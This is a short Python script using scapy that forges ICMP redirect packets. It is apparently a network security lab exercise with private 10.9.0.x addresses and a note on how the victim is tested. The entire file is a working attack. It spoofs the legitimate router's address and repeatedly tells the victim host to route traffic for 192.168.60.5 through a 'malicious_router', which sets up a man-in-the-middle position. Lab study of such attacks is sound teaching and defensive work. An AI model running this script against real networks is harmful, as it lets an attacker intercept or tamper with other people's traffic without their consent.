#!/usr/bin/python3
from scapy.all import *

victim_ip = "10.9.0.5"
malicious_router = "10.9.0.111"
original_router = "10.9.0.11"
destination_ip = "192.168.60.5"

while True:
    ip = IP(src = original_router, dst = victim_ip)
    icmp = ICMP(type=5, code=1)
    icmp.gw = malicious_router
    # The enclosed IP packet should be the one that
    # triggers the redirect message.
    ip2 = IP(src = victim_ip, dst = destination_ip)
    send(ip/icmp/ip2/ICMP())

    time.sleep(2)


#### Note ####
# when testing the victim machine will run the command "mtr -n 192.168.60.5"